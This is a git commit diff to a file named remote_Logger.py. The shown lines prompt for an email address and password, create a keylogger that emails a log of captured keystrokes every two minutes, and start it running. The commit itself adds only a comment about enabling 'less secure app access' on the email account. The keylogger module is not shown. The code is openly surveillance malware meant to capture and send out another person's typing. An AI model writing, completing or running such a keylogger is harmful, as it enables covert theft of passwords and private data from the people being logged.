33de0b94d79e972f74d1e471f0717f43ea370295
Jonscott92 <62578437+Jonscott92@users.noreply.github.com>
2020-05-07 19:42:26 -0400

    Update remote_Logger.py

--- remote_Logger.py
+++ remote_Logger.py
@@ -6,3 +6,4 @@ email_password = input(str("Enter password: "))
 #keylogger that uses email and password entered then sends a log of keystrokes every 2 minutes
 my_keylogger = keylogger.Keylogger(email=email_address, password=email_password, time_interval=120)
 my_keylogger.start_logging()
+# turn on less secure app access
